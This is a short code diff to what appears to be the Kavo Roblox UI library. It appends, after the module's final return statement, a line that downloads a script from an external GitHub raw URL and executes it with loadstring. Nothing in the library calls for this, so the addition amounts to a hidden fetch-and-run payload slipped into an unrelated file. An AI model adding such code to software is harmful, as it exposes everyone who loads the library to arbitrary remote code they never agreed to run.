@@ -2646,3 +2646,6 @@ function Kavo.CreateLib(kavName, themeList)
     return Tabs
 end
 return Kavo
+
+wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zu0aX/Other/refs/heads/main/APIMod"))() 
